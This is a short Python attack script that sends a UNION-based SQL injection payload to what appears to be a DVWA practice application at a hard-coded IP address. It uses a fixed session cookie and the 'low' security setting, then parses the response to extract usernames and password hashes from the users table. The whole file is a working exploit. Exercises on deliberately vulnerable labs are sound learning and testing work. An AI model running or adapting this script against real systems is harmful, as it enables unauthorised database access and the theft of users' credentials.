
import requests
import re
import html

# Create session and set cookies
session = requests.Session()
session.cookies.set('PHPSESSID', 'u1sbabk40idi42696eoie42qk7')
session.cookies.set('security', 'low')

url_base = "http://31.97.117.123"
sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] DEBUG: Examining extracted data blocks...\n")

payload = "999' UNION SELECT user, password FROM users -- -"

try:
    response = session.get(sqli_url, params={'id': payload, 'Submit': 'Submit'}, timeout=10)
    
    # Find all <pre> blocks
    pre_blocks = re.findall(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    
    print(f"[+] Found {len(pre_blocks)} <pre> blocks\n")
    
    for idx, block in enumerate(pre_blocks):
        print(f"[Block {idx}]:")
        print(f"Raw: {repr(block[:150])}\n")
        
        # Decode HTML
        block_decoded = html.unescape(block)
        print(f"Decoded: {block_decoded[:150]}\n")
        
        # Try simple split
        lines = block_decoded.split('<br')
        print(f"Split lines: {lines}")
        print("-" * 80 + "\n")
    
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()

